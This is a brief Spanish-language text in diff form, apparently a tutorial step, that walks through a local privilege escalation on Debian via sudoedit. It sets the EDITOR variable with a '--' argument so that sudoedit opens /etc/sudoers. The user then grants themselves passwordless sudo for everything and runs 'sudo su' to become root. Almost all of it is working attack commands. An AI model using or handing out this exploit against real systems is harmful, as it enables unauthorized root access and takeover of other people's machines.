@@ -1,0 +1,17 @@
+Ejecutamos:
+
+1) carlos@debian~$ export EDITOR="nano -- /etc/sudoers"
+
+(podemos usar otro editor como vi)
+
+2) carlos@debian~$ sudo sudoedit /etc/documento.txt
+
+Con esto nos debe dejar entrar a /etc/sudoers para cambiar los 
+permisos del usuario carlos y dejarlos asi:
+
+carlos ALL=(ALL:ALL) NOPASSWD: ALL
+
+3) carlos@debian~$ sudo su
+
+Con eso ya seremos usuario root.
+
